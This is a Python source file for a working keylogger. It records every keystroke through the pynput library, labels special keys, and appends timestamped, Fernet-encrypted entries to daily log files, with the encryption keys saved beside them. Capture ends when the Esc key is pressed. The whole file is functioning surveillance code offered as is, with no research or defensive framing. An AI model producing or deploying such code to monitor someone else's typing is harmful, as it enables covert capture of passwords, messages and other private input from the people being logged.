from pynput import keyboard
from pynput.keyboard import Key
from datetime import datetime
from cryptography.fernet import Fernet
import os

class KeyLogger:
    def __init__(self):
        self.current_date = datetime.now().date()
        self.filename = self.get_filename()
        self.buffer = ""
        self.fernet = self.load_daily_key()

    def get_filename(self):
        date_str = self.current_date.strftime("%Y-%m-%d")
        return f"keylogs_encrypted_{date_str}.txt"

    def get_key_filename(self):
        date_str = self.current_date.strftime("%Y-%m-%d")
        return f"secret_{date_str}.key"

    def load_daily_key(self):
        key_file = self.get_key_filename()

        if not os.path.exists(key_file):
            key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(key)
        else:
            with open(key_file, 'rb') as f:
                key = f.read()

        return Fernet(key)

    @staticmethod
    def get_char(key):
        special_keys = {
            Key.enter: '[ENTER]',
            Key.space: ' ',
            Key.backspace: '[BACKSPACE]',
            Key.tab: '[TAB]',
            Key.esc: '[ESC]',
            Key.shift: '',
            Key.shift_r: '',
            Key.ctrl: '',
            Key.ctrl_r: '',
            Key.alt: '',
            Key.alt_r: '',
            Key.delete: '[DEL]',
            Key.up: '[UP]',
            Key.down: '[DOWN]',
            Key.left: '[LEFT]',
            Key.right: '[RIGHT]',
            Key.caps_lock: '[CAPSLOCK]',
        }
        if key in special_keys:
            return special_keys[key]
        try:
            return key.char
        except AttributeError:
            return f'[{str(key)}]'

    def flush_to_file(self):
        today = datetime.now().date()

        # If the date has changed, reset key and filename
        if today != self.current_date:
            self.current_date = today
            self.filename = self.get_filename()
            self.fernet = self.load_daily_key()

        if self.buffer.strip():
            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            message = f"[{current_time}] {self.buffer}"
            encrypted = self.fernet.encrypt(message.encode())

            with open(self.filename, 'ab') as logs:
                logs.write(encrypted + b'\n')
            self.buffer = ""

    def on_press(self, key):
        char = self.get_char(key)
        self.buffer += char

        if key == Key.enter or key == Key.esc:
            self.flush_to_file()

        if key == Key.esc:
            return False

    def main(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == '__main__':
    logger = KeyLogger()
    logger.main()
    input("Press ESC to exit...\n")
